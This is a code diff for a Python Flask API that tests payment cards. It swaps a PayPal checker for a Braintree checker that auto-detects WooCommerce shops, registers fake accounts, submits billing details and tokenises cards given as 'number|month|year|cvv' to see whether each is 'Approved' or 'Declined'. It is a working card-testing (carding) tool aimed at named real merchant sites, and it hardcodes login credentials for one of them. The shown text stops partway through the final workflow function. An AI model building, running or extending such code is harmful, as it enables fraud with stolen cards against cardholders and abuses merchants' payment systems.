@@ -1,364 +1,827 @@
-import requests
+#!/usr/bin/env python3
+"""
+==============================================================
+  AUTO BRAINTREE FLASK API - SMART AUTO-DETECT VERSION
+  Automatically tries all URL patterns for any site
+==============================================================
+"""
+
+from flask import Flask, jsonify
+import asyncio
+import aiohttp
 import json
-import logging
-import re
 import time
-from flask import Flask, jsonify, request
-from urllib.parse import unquote
+import base64
+import re
+import random
+import string
+import hashlib
+import urllib.parse
+from datetime import datetime
+from bs4 import BeautifulSoup
+from faker import Faker
+import logging
 
 # Configure logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
-)
+logging.basicConfig(level=logging.WARNING)
+logger = logging.getLogger(__name__)
 
-# Initialize Flask App
+# Initialize
 app = Flask(__name__)
+fake = Faker('en_US')
 
-# --- Status Mapping Rules ---
-# Define the sets of codes for each status
-APPROVED_CODES = {"INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED"}
-DECLINED_CODES = {
-    "CARD_GENERIC_ERROR",
-    "COUNTRY_NOT_SUPPORTED",
-    "EXPIRED_CARD",
-    "VALIDATION_ERROR",
-    "LOGIN_ERROR",
-    "RISK_DISALLOWED",
-    "TOKEN_EXTRACTION_ERROR",
-    "NETWORK_ERROR",
-    "INTERNAL_ERROR",
-    "INVALID_MONTH",
-    "UNKNOWN_ERROR"
+# ============================================================
+# CONFIGURATION
+# ============================================================
+
+API_KEY = "md-tech1"
+
+# URL patterns to try for each site
+URL_PATTERNS = [
+    {
+        'name': 'Standard WooCommerce',
+        'register_url': '/my-account/',
+        'address_url': '/my-account/edit-address/billing/',
+        'payment_url': '/my-account/add-payment-method/',
+        'payment_method': 'braintree_credit_card'
+    },
+    {
+        'name': 'Customer Account',
+        'register_url': '/customer-account/?action=register',
+        'address_url': '/customer-account/edit-address/billing/',
+        'payment_url': '/customer-account/add-payment-method/',
+        'payment_method': 'braintree_cc'
+    },
+    {
+        'name': 'Account Path',
+        'register_url': '/account/register/',
+        'address_url': '/account/edit-address/billing/',
+        'payment_url': '/account/add-payment-method/',
+        'payment_method': 'braintree_credit_card'
+    }
+]
+
+# Payment method variations to try
+PAYMENT_METHODS = ['braintree_credit_card', 'braintree_cc', 'braintree', 'wc_braintree_credit_card']
+
+# Default sites list
+DEFAULT_SITES = [
+"https://parts.lagunatools.com"
+]
+
+# Known working configurations (cache)
+KNOWN_CONFIGS = {
+    'parts.lagunatools.com': {
+        'register_url': '/customer-account/?action=register',
+        'address_url': '/customer-account/edit-address/billing/',
+        'payment_url': '/customer-account/add-payment-method/',
+        'payment_method': 'braintree_cc'
+    },
+    'assurancehomehealthcare.ca': {
+        'register_url': '/my-account/',
+        'address_url': '/my-account/edit-address/billing/',
+        'payment_url': '/my-account/add-payment-method/',
+        'payment_method': 'braintree_credit_card',
+        'use_login': True,
+        'email': 'keygenmd5@gmail.com',
+        'password': 'PK4hTkbtP8hHsgf'
+    }
 }
 
-def parse_proxy_string(proxy_string):
-    """Parses a proxy string in various formats into a requests-compatible dictionary."""
-    try:
-        proxy_string = unquote(proxy_string)
-        
-        if proxy_string.startswith('http://') or proxy_string.startswith('https://'):
-            return {'http': proxy_string, 'https': proxy_string}
-        
-        if '@' in proxy_string:
-            auth_part, addr_part = proxy_string.split('@', 1)
-            if ':' in addr_part:
-                ip, port = addr_part.split(':', 1)
-                proxy_url = f"http://{auth_part}@{ip}:{port}"
-                return {'http': proxy_url, 'https': proxy_url}
-        
-        parts = proxy_string.split(':')
-        if len(parts) == 4:
-            ip, port, user, password = parts
-            proxy_url = f"http://{user}:{password}@{ip}:{port}"
-            return {'http': proxy_url, 'https': proxy_url}
-        
-        raise ValueError("Invalid format. Expected http://user:pass@ip:port or user:pass@ip:port or ip:port:user:pass")
-    except Exception as e:
-        logging.error(f"Error parsing proxy string '{proxy_string}': {e}")
-        raise ValueError(f"Could not parse proxy string: {e}")
+# ============================================================
+# UTILITY FUNCTIONS
+# ============================================================
 
-def check_proxy_connection(proxy_config):
-    """Tests a connection to the outside world using the provided proxy."""
+def validate_cc(cc):
+    """Validate credit card format"""
     try:
-        logging.info("Testing proxy connection...")
-        response = requests.get(
-            'http://httpbin.org/ip', 
-            proxies=proxy_config, 
-            timeout=10
+        if not cc or '|' not in cc:
+            return False, "Invalid format"
+        parts = cc.split("|")
+        if len(parts) != 4:
+            return False, "Invalid format"
+        num, mm, yy, cvc = parts
+        num = ''.join(filter(str.isdigit, num))
+        if not num or len(num) < 13 or len(num) > 19:
+            return False, "Invalid card"
+        if not mm.isdigit() or not (1 <= int(mm) <= 12):
+            return False, "Invalid month"
+        if not yy.isdigit():
+            return False, "Invalid year"
+        if not cvc.isdigit() or len(cvc) not in [3, 4]:
+            return False, "Invalid CVV"
+        return True, "Valid"
+    except:
+        return False, "Error"
+
+def get_card_type(card_number):
+    """Get card brand"""
+    card_number = str(card_number)
+    if card_number.startswith('4'):
+        return 'visa'
+    elif card_number.startswith(('51', '52', '53', '54', '55')):
+        return 'mastercard'
+    elif card_number.startswith(('34', '37')):
+        return 'amex'
+    else:
+        return 'unknown'
+
+def generate_user_data():
+    """Generate realistic user data"""
+    first_name = fake.first_name()
+    last_name = fake.last_name()
+    return {
+        'first_name': first_name,
+        'last_name': last_name,
+        'email': f"{first_name.lower()}{last_name.lower()}{random.randint(100,999)}@gmail.com",
+        'password': f"{fake.word()}{random.randint(1000,9999)}{fake.word()}",
+        'phone': f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}",
+        'address': fake.street_address(),
+        'city': 'New York',
+        'state': 'NY',
+        'zipcode': '10080'
+    }
+
+def extract_domain(url):
+    """Extract domain"""
+    try:
+        if not url.startswith(('http://', 'https://')):
+            url = f'https://{url}'
+        from urllib.parse import urlparse
+        parsed = urlparse(url)
+        domain = parsed.netloc or parsed.path
+        return domain.replace('www.', '')
+    except:
+        return url
+
+def find_between(data, first, last):
+    """Extract text between delimiters"""
+    try:
+        start = data.index(first) + len(first)
+        end = data.index(last, start)
+        return data[start:end]
+    except:
+        return None
+
+# ============================================================
+# SMART BRAINTREE CHECKER WITH AUTO-DETECTION
+# ============================================================
+
+class SmartBraintreeChecker:
+    """Smart Braintree checker that auto-detects URL patterns"""
+    
+    def __init__(self, domain):
+        self.domain = domain
+        self.base_url = f'https://{domain}'
+        self.timeout = aiohttp.ClientTimeout(total=30)
+        self.session = None
+        self.detected_config = None
+        self.base_headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 15; RMX3771) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
+        }
+    
+    async def __aenter__(self):
+        connector = aiohttp.TCPConnector(ssl=False)
+        self.session = aiohttp.ClientSession(
+            connector=connector,
+            timeout=self.timeout,
+            cookie_jar=aiohttp.CookieJar()
         )
-        response.raise_for_status()
-        logging.info(f"Proxy connection successful. External IP: {response.json()['origin']}")
+        return self
+    
+    async def __aexit__(self, exc_type, exc_val, exc_tb):
+        if self.session:
+            await self.session.close()
+    
+    def extract_tokens(self, html):
+        """Extract CSRF tokens from HTML"""
+        tokens = {}
+        patterns = {
+            'register_nonce': r'name="woocommerce-register-nonce" value="([^"]+)"',
+            'login_nonce': r'name="woocommerce-login-nonce" value="([^"]+)"',
+            'edit_address_nonce': r'name="woocommerce-edit-address-nonce" value="([^"]+)"',
+            'add_payment_nonce': r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
+            'wp_referer': r'name="_wp_http_referer" value="([^"]+)"'
+        }
+        for key, pattern in patterns.items():
+            match = re.search(pattern, html)
+            tokens[key] = match.group(1) if match else None
+        return tokens
+    
+    async def detect_braintree_config(self):
+        """Auto-detect Braintree configuration for this site"""
+        logger.info(f"Auto-detecting Braintree config for {self.domain}")
+        
+        # Check if we have a known config
+        if self.domain in KNOWN_CONFIGS:
+            self.detected_config = KNOWN_CONFIGS[self.domain]
+            logger.info(f"Using known config for {self.domain}")
+            return True
+        
+        # Try all URL patterns
+        for pattern in URL_PATTERNS:
+            try:
+                payment_url = f"{self.base_url}{pattern['payment_url']}"
+                
+                headers = self.base_headers.copy()
+                async with self.session.get(payment_url, headers=headers, allow_redirects=False) as response:
+                    # Check if page exists (200) or redirects to login (302)
+                    if response.status in [200, 302]:
+                        html = await response.text() if response.status == 200 else ""
+                        
+                        # Check for Braintree indicators
+                        if any(indicator in html.lower() for indicator in ['braintree', 'braintree_client_token', 'wc-braintree']):
+                            logger.info(f"Detected Braintree on {payment_url} using pattern: {pattern['name']}")
+                            self.detected_config = pattern.copy()
+                            return True
+                
+            except Exception as e:
+                logger.debug(f"Pattern {pattern['name']} failed: {str(e)[:50]}")
+                continue
+        
+        # If no pattern worked, use default
+        logger.info(f"Using default pattern for {self.domain}")
+        self.detected_config = URL_PATTERNS[0].copy()
         return True
-    except requests.exceptions.RequestException as e:
-        logging.error(f"Proxy connection failed: {e}")
-        return False
-
-def extract_csrf_token(html_content):
-    """Extract CSRF token from HTML content with multiple patterns."""
-    try:
-        patterns = [
-            r'"csrfToken":"([^"]+)"',
-            r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']',
-            r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']',
-            r'data-csrf=["\']([^"\']+)["\']',
-            r'"token":"([^"]+)"',
-            r'name="_token"\s+value="([^"]+)"'
-        ]
-        
-        for pattern in patterns:
-            match = re.search(pattern, html_content)
-            if match:
-                return match.group(1)
-        
-        logging.warning(f"CSRF token not found. Page content snippet: {html_content[:500]}...")
-        return None
-    except Exception as e:
-        logging.error(f"Error extracting CSRF token: {e}")
-        return None
-
-def process_paypal_payment(card_details_string, proxy_config):
-    """
-    Processes the PayPal payment using the provided card details and proxy.
-    The string should be in the format: 'card_number|mm|yy|cvv'
-    Returns a dictionary with 'code' and 'message' from the PayPal response.
-    """
-    # --- 1. Parse and Validate Card Details ---
-    parts = card_details_string.split('|')
-    if len(parts) != 4:
-        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid input format. Expected: card_number|mm|yy|cvv'}
-
-    card_number, month, year, cvv = [p.strip() for p in parts]
-
-    if not month.isdigit() or len(month) != 2 or not (1 <= int(month) <= 12):
-        return {'code': 'INVALID_MONTH', 'message': 'Invalid expiration month provided.'}
-    if not year.isdigit():
-        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
-    if len(year) == 2: year = '20' + year
-    elif len(year) != 4: return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
-    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
-        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid CVV format.'}
-
-    expiry_date = f"{month}/{year}"
-    card_type = 'VISA' if card_number.startswith('4') else ('MASTER_CARD' if card_number.startswith('5') else ('AMEX' if card_number.startswith('3') else 'UNKNOWN'))
-    currency_conversion_type = 'VENDOR' if card_type == 'AMEX' else 'PAYPAL'
-    card_details = {'cardNumber': card_number, 'type': card_type, 'expirationDate': expiry_date, 'securityCode': cvv, 'postalCode': '10010'}
-
-    # --- 2. Execute PayPal Request Sequence with Improved Token Acquisition ---
     
-    session = requests.Session()
-    session.proxies.update(proxy_config)
-    token = None
+    async def get_page(self, url, referer=None):
+        """Get page content"""
+        try:
+            headers = self.base_headers.copy()
+            if referer:
+                headers['referer'] = referer
+            async with self.session.get(url, headers=headers, allow_redirects=True) as response:
+                return True, await response.text()
+        except Exception as e:
+            return False, str(e)
     
-    max_retries = 3
-    for attempt in range(max_retries):
-        logging.info(f"Token acquisition attempt {attempt + 1}/{max_retries}")
-        csrf_token = None
-        
-        # --- Step 1: Get initial CSRF token ---
+    async def register_account(self, user_data):
+        """Register new account with smart retry logic"""
+        try:
+            logger.info(f"Registering: {user_data['email']}")
+            
+            # Try all registration URL patterns
+            reg_urls = [
+                f"{self.base_url}{self.detected_config['register_url']}",
+                f"{self.base_url}/my-account/",
+                f"{self.base_url}/customer-account/?action=register",
+                f"{self.base_url}/account/register/"
+            ]
+            
+            html = None
+            working_reg_url = None
+            
+            # Try each URL until we find one with a registration form
+            for reg_url in reg_urls:
+                try:
+                    success, test_html = await self.get_page(reg_url)
+                    if success and 'woocommerce-register-nonce' in test_html:
+                        html = test_html
+                        working_reg_url = reg_url
+                        logger.info(f"Found registration form at: {reg_url}")
+                        break
+                except:
+                    continue
+            
+            if not html or not working_reg_url:
+                return False, "No registration form found"
+            
+            tokens = self.extract_tokens(html)
+            if not tokens.get('register_nonce'):
+                return False, "No registration token found"
+            
+            headers = self.base_headers.copy()
+            headers.update({
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': self.base_url,
+                'referer': working_reg_url
+            })
+            
+            # Build flexible registration form
+            form_data = {
+                'email': user_data['email'],
+                'woocommerce-register-nonce': tokens['register_nonce'],
+                '_wp_http_referer': tokens.get('wp_referer', '/my-account/'),
+                'register': 'Register'
+            }
+            
+            # Check what fields are required in the form
+            if 'name="username"' in html or 'name="reg_username"' in html:
+                form_data['username'] = user_data['email'].split('@')[0]
+            
+            if 'name="password"' in html or 'name="reg_password"' in html:
+                form_data['password'] = user_data['password']
+            
+            if 'name="email_2"' in html:
+                form_data['email_2'] = ''
+            
+            # Add WooCommerce attribution
+            form_data.update({
+                'wc_order_attribution_source_type': 'typein',
+                'wc_order_attribution_referrer': '(none)',
+                'wc_order_attribution_utm_source': '(direct)',
+                'wc_order_attribution_utm_medium': '(none)',
+                'wc_order_attribution_session_pages': '1',
+                'wc_order_attribution_session_count': '1',
+                'wc_order_attribution_user_agent': self.base_headers['user-agent']
+            })
+            
+            data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
+            
+            async with self.session.post(working_reg_url, headers=headers, data=data_str, allow_redirects=True) as response:
+                result = await response.text()
+                final_url = str(response.url)
+                
+                # Check multiple success indicators
+                if any(x in result for x in ['Log out', 'logout', 'Dashboard', 'My Account', 'my-account/edit-address']):
+                    if 'login' not in final_url.lower() or 'my-account' in final_url.lower():
+                        logger.info("Registration successful")
+                        return True, user_data
+                
+                # Check if account already exists (some sites auto-login)
+                if 'already registered' in result.lower() or 'already exists' in result.lower():
+                    logger.info("Account exists, trying different email")
+                    # Generate new email and retry once
+                    user_data['email'] = f"{fake.first_name().lower()}{random.randint(1000,9999)}@gmail.com"
+                    return await self.register_account(user_data)
+                
+                return False, "Registration form submitted but no success confirmation"
+                
+        except Exception as e:
+            return False, f"Registration error: {str(e)[:50]}"
+
+    
+    async def update_billing_address(self, user_data):
+        """Update billing address with auto-detection"""
+        try:
+            logger.info("Updating billing address")
+            
+            edit_url = f"{self.base_url}{self.detected_config['address_url']}"
+            success, html = await self.get_page(edit_url)
+            if not success:
+                return False, "Address page not accessible"
+            
+            tokens = self.extract_tokens(html)
+            if not tokens.get('edit_address_nonce'):
+                return False, "No address token"
+            
+            headers = self.base_headers.copy()
+            headers.update({
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': self.base_url,
+                'referer': edit_url
+            })
+            
+            form_data = {
+                'billing_first_name': user_data['first_name'],
+                'billing_last_name': user_data['last_name'],
+                'billing_country': 'US',
+                'billing_address_1': user_data['address'],
+                'billing_address_2': '',
+                'billing_city': user_data['city'],
+                'billing_state': user_data['state'],
+                'billing_postcode': user_data['zipcode'],
+                'billing_phone': user_data['phone'],
+                'billing_email': user_data['email'],
+                'save_address': 'Save address',
+                'woocommerce-edit-address-nonce': tokens['edit_address_nonce'],
+                '_wp_http_referer': tokens.get('wp_referer', self.detected_config['address_url']),
+                'action': 'edit_address'
+            }
+            
+            data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
+            
+            async with self.session.post(edit_url, headers=headers, data=data_str) as response:
+                result = await response.text()
+                if "successfully" in result.lower() or "changed" in result.lower():
+                    logger.info("Address updated")
+                    return True, "Success"
+                return False, "Failed"
+        except Exception as e:
+            return False, f"Error: {str(e)[:50]}"
+    
+    def site_response(self, result):
+        """Parse WooCommerce response"""
+        try:
+            soup = BeautifulSoup(result, 'html.parser')
+            
+            # Check for error
+            error_container = soup.find('ul', class_='woocommerce-error')
+            if error_container:
+                error_items = error_container.find_all('li')
+                for error_item in error_items:
+                    error_text = error_item.get_text(strip=True)
+                    if error_text:
+                        return f"Declined: {error_text}"
+                return "Declined: Unknown error"
+            
+            # Check for success
+            success_container = soup.find('div', class_='woocommerce-message')
+            if success_container:
+                return "Approved: Payment method added successfully"
+            
+            # Check text content
+            if 'payment method was successfully added' in result.lower():
+                return "Approved: Payment method added"
+            
+            return "Unknown Response"
+        except:
+            return "Parse error"
+    
+    async def get_payment_nonces(self):
+        """Get payment nonces with AJAX fallback"""
+        try:
+            payment_url = f"{self.base_url}{self.detected_config['payment_url']}"
+            headers = self.base_headers.copy()
+            
+            async with self.session.get(payment_url, headers=headers, allow_redirects=True) as response:
+                html = await response.text()
+                final_url = str(response.url)
+                
+                # Check if redirected to login
+                if 'login' in final_url.lower() and 'add-payment' not in final_url.lower():
+                    return None, None, "Requires authentication"
+                
+                # Extract tokens
+                tokens = self.extract_tokens(html)
+                add_payment_nonce = tokens.get('add_payment_nonce')
+                
+                if not add_payment_nonce:
+                    return None, None, "No payment nonce"
+                
+                # Try to extract embedded client token
+                patterns = [
+                    r'braintree_client_token\s*=\s*\["([^"]+)"\]',
+                    r'var\s+clientToken\s*=\s*["\']([^"\']+)["\']',
+                    r'["\']clientToken["\']:\s*["\']([^"\']+)["\']'
+                ]
+                
+                client_token = None
+                for pattern in patterns:
+                    match = re.search(pattern, html)
+                    if match:
+                        client_token = match.group(1)
+                        break
+                
+                # If no embedded token, try AJAX
+                if not client_token:
+                    client_nonce_match = re.search(r'"client_token_nonce":"([^"]+)"', html)
+                    if client_nonce_match:
+                        client_nonce = client_nonce_match.group(1)
+                        
+                        ajax_headers = {
+                            'accept': '*/*',
+                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                            'user-agent': self.base_headers['user-agent'],
+                            'x-requested-with': 'XMLHttpRequest',
+                            'origin': self.base_url,
+                            'referer': payment_url
+                        }
+                        
+                        ajax_data = {
+                            'action': 'wc_braintree_credit_card_get_client_token',
+                            'nonce': client_nonce
+                        }
+                        
+                        data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in ajax_data.items()])
+                        
+                        async with self.session.post(
+                            f'{self.base_url}/wp-admin/admin-ajax.php',
+                            headers=ajax_headers,
+                            data=data_str
+                        ) as ajax_response:
+                            if ajax_response.status == 200:
+                                ajax_result = await ajax_response.json()
+                                if ajax_result.get('success'):
+                                    client_token = ajax_result.get('data')
+                
+                return add_payment_nonce, client_token, None
+        except Exception as e:
+            return None, None, f"Nonces error: {str(e)[:50]}"
+    
+    async def decode_client_token(self, client_token):
+        """Decode client token"""
+        try:
+            decoded = json.loads(base64.b64decode(client_token).decode('utf-8'))
+            return decoded.get('authorizationFingerprint')
+        except:
+            return None
+    
+    async def tokenize_cc(self, auth, num, mm, yy, cvc, zipcode):
+        """Tokenize card with Braintree"""
+        try:
+            if len(yy) == 2:
+                yy = str(datetime.now().year // 100) + yy
+            
+            headers = {
+                'authority': 'payments.braintree-api.com',
+                'accept': '*/*',
+                'authorization': f'Bearer {auth}',
+                'braintree-version': '2018-05-10',
+                'content-type': 'application/json',
+                'origin': 'https://assets.braintreegateway.com',
+                'user-agent': self.base_headers['user-agent']
+            }
+            
+            payload = {
+                "clientSdkMetadata": {
+                    "source": "client",
+                    "integration": "custom",
+                    "sessionId": hashlib.md5(str(time.time()).encode()).hexdigest()[:36]
+                },
+                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
+                "variables": {
+                    "input": {
+                        "creditCard": {
+                            "number": num,
+                            "expirationMonth": mm,
+                            "expirationYear": yy,
+                            "cvv": cvc,
+                            "billingAddress": {"postalCode": zipcode}
+                        },
+                        "options": {"validate": False}
+                    }
+                },
+                "operationName": "TokenizeCreditCard"
+            }
+            
+            connector = aiohttp.TCPConnector(ssl=False)
+            async with aiohttp.ClientSession(connector=connector) as temp:
+                async with temp.post('https://payments.braintree-api.com/graphql', headers=headers, json=payload, timeout=aiohttp.ClientTimeout(total=20)) as response:
+                    result = await response.json()
+                    if response.status == 200 and 'data' in result:
+                        token = result['data']['tokenizeCreditCard']['token']
+                        return {'success': True, 'token': token}
+                    else:
+                        error = result.get('errors', [{}])[0].get('message', 'Tokenization failed')
+                        return {'success': False, 'error': error}
+        except Exception as e:
+            return {'success': False, 'error': str(e)[:50]}
+    
+    async def add_payment_method(self, add_payment_nonce, payment_token):
+        """Add payment method with flexible payment method detection"""
         try:
             headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Cache-Control': 'no-cache', 'Pragma': 'no-cache',
+                'accept': 'text/html,*/*',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': self.base_url,
+                'referer': f"{self.base_url}{self.detected_config['payment_url']}",
+                'user-agent': self.base_headers['user-agent']
             }
-            response = session.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', headers=headers, timeout=15)
-            response.raise_for_status()
-            csrf_token = extract_csrf_token(response.text)
-            if not csrf_token:
-                logging.warning("Could not extract initial CSRF token. Retrying...")
-                time.sleep(3)
-                continue
-        except requests.exceptions.RequestException as e:
-            logging.warning(f"Network error fetching CSRF token: {e}. Retrying...")
-            time.sleep(3)
-            continue
-
-        # --- Step 2: Create Order with CSRF retry logic ---
-        headers = {
-            'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
-            'referer': 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'x-csrf-token': csrf_token,
-        }
-        json_data = {
-            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': '1',
-            'currency': 'USD', 'currencySymbol': '$', 'funding_source': 'CARD',
-            'button_type': 'VARIABLE_PRICE', 'csrfRetryEnabled': True,
-        }
-        
-        try:
-            response = session.post('https://www.paypal.com/ncp/api/create-order', cookies=session.cookies, headers=headers, json=json_data, timeout=10)
             
-            # --- FIX: Handle CSRF Mismatch Retry ---
-            if response.status_code == 202:
-                try:
-                    retry_data = response.json()
-                    if retry_data.get("message") == "CSRF_MISMATCH_RETRY" and retry_data.get("csrfToken"):
-                        new_csrf_token = retry_data.get("csrfToken")
-                        logging.info("CSRF mismatch detected. Retrying with new token.")
-                        headers['x-csrf-token'] = new_csrf_token
-                        response = session.post('https://www.paypal.com/ncp/api/create-order', cookies=session.cookies, headers=headers, json=json_data, timeout=10)
-                except (ValueError, KeyError) as e:
-                    logging.error(f"Failed to parse CSRF retry response: {e}")
-
-            response.raise_for_status() # Raises error for non-2xx status codes
-            response_data = response.json()
+            payment_method = self.detected_config['payment_method']
             
-            if 'context_id' in response_data:
-                token = response_data['context_id']
-                logging.info(f"Successfully extracted token: {token}")
-                break # Success! Exit the retry loop.
+            # Build form data based on payment method type
+            if payment_method == 'braintree_cc':
+                data = {
+                    'payment_method': 'braintree_cc',
+                    'braintree_cc_nonce_key': payment_token,
+                    'braintree_cc_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
+                    'braintree_cc_3ds_nonce_key': '',
+                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
+                    '_wp_http_referer': self.detected_config['payment_url'],
+                    'woocommerce_add_payment_method': '1'
+                }
             else:
-                logging.error(f"Create-order successful but no token found. Response: {response.text}")
-                if attempt < max_retries - 1:
-                    time.sleep(3)
-                    continue
+                data = {
+                    'payment_method': payment_method,
+                    f'wc-{payment_method}-card-type': 'visa',
+                    f'wc_{payment_method}_payment_nonce': payment_token,
+                    f'wc_{payment_method}_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
+                    f'wc-{payment_method}-tokenize-payment-method': 'true',
+                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
+                    '_wp_http_referer': self.detected_config['payment_url'],
+                    'woocommerce_add_payment_method': '1'
+                }
+            
+            encoded = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in data.items()])
+            
+            async with self.session.post(
+                f"{self.base_url}{self.detected_config['payment_url']}",
+                headers=headers,
+                data=encoded
+            ) as response:
+                html = await response.text()
+                parsed = self.site_response(html)
+                
+                if 'approved' in parsed.lower() or 'success' in parsed.lower():
+                    return {'success': True, 'response': parsed}
                 else:
-                    return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'PayPal API response did not contain a token.'}
-
-        except requests.exceptions.HTTPError as e:
-            logging.error(f"HTTP error during create-order call: {e}. Response: {e.response.text}")
-            if attempt < max_retries - 1:
-                time.sleep(3)
-                continue
-            else:
-                return {'code': 'NETWORK_ERROR', 'message': f'PayPal API returned an error: {e.response.status_code}'}
-        except (ValueError, requests.exceptions.RequestException) as e:
-            logging.error(f"Request/JSON error during create-order call: {e}.")
-            if attempt < max_retries - 1:
-                time.sleep(3)
-                continue
-            else:
-                return {'code': 'NETWORK_ERROR', 'message': 'Failed to communicate with PayPal API.'}
-
-    if not token:
-        logging.error(f"Failed to extract token after {max_retries} attempts.")
-        return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract token from PayPal after multiple retries.'}
-
-    # --- Request 3: Submit Card Details ---
-    headers = {
-        'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
-        'paypal-client-context': token, 'paypal-client-metadata-id': token,
-        'referer': f'https://www.paypal.com/smart/card-fields?token={token}',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'x-app-name': 'standardcardfields', 'x-country': 'US',
-    }
-
-    graphql_query = """
-    mutation payWithCard(
-        $token: String!
-        $card: CardInput
-        $paymentToken: String
-        $phoneNumber: String
-        $firstName: String
-        $lastName: String
-        $shippingAddress: AddressInput
-        $billingAddress: AddressInput
-        $email: String
-        $currencyConversionType: CheckoutCurrencyConversionType
-        $installmentTerm: Int
-        $identityDocument: IdentityDocumentInput
-        $feeReferenceId: String
-    ) {
-        approveGuestPaymentWithCreditCard(
-            token: $token
-            card: $card
-            paymentToken: $paymentToken
-            phoneNumber: $phoneNumber
-            firstName: $firstName
-            lastName: $lastName
-            email: $email
-            shippingAddress: $shippingAddress
-            billingAddress: $billingAddress
-            currencyConversionType: $currencyConversionType
-            installmentTerm: $installmentTerm
-            identityDocument: $identityDocument
-            feeReferenceId: $feeReferenceId
-        ) {
-            flags {
-                is3DSecureRequired
-            }
-            cart {
-                intent
-                cartId
-                buyer {
-                    userId
-                    auth {
-                        accessToken
-                    }
-                }
-                returnUrl {
-                    href
-                }
-            }
-            paymentContingencies {
-                threeDomainSecure {
-                    status
-                    method
-                    redirectUrl {
-                        href
-                    }
-                    parameter
-                }
-            }
-        }
-    }
-    """
+                    return {'success': False, 'response': parsed}
+        except Exception as e:
+            return {'success': False, 'response': str(e)[:50]}
     
-    json_data = {
-        'query': graphql_query.strip(),
-        'variables': {
-            'token': token, 'card': card_details, 'phoneNumber': '4073320637',
-            'firstName': 'Rockcy', 'lastName': 'og',
-            'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
-            'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
-            'email': 'rocky2@gmail.com', 'currencyConversionType': currency_conversion_type,
-        }, 'operationName': None,
-    }
+    async def check_cc(self, cc_data):
+        """Check credit card"""
+        try:
+            num, mm, yy, cvc = cc_data.split("|")
+            
+            # Get payment nonces
+            add_payment_nonce, client_token, error = await self.get_payment_nonces()
+            if error:
+                return {'success': False, 'error': error}
+            if not add_payment_nonce or not client_token:
+                return {'success': False, 'error': 'Failed to get payment tokens'}
+            
+            # Decode client token
+            auth = await self.decode_client_token(client_token)
+            if not auth:
+                return {'success': False, 'error': 'Failed to decode token'}
+            
+            # Tokenize card
+            token_result = await self.tokenize_cc(auth, num, mm, yy, cvc, "10080")
+            if not token_result.get('success'):
+                return {'success': False, 'error': token_result.get('error')}
+            
+            # Add payment method
+            add_result = await self.add_payment_method(add_payment_nonce, token_result['token'])
+            return add_result
+            
+        except Exception as e:
+            return {'success': False, 'error': str(e)[:50]}
+    
+    async def complete_workflow(self, cc_data):
+        """Complete workflow with auto-detection"""
+        try:
+            # Detect Braintree configuration
+            if not await self.detect_braintree_config():
+                return {'success': False, 'response': 'Braintree detection failed'}
+            
+            # Register account
+            user_data = generate_user_data()
+            success, result = await self.register_account(user_data)
+            if not success:
+                return {'success': False, 'response': f'Registration failed: {result}'}
+            
+            await asyncio.sleep(2)
+            await self.update_billing_address(user_data)
+            await asyncio.sleep(1)
+            
+            # Check card
+            cc_result = await self.check_cc(cc_data)
+            
+            if cc_result.get('success'):
+                return {'success': True, 'response': cc_result['response']}
+            else:
